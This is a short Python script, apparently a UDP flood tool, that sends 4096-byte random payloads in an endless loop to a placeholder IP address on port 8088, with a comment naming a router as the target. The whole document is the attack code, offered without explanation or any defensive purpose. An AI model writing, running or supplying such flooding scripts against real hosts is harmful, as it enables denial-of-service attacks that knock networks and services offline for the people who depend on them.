import socket
import random

target_ip = "IP ADDRESS"

target_port = 8088

# 21 , 22, 23, 25, 80, 443
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Generate random bytes for the payload
payload = bytes(random.getrandbits(8) for _ in range(4096))

# Send a flood of packets to the router.
while True:
    sock.sendto(payload, (target_ip, target_port))
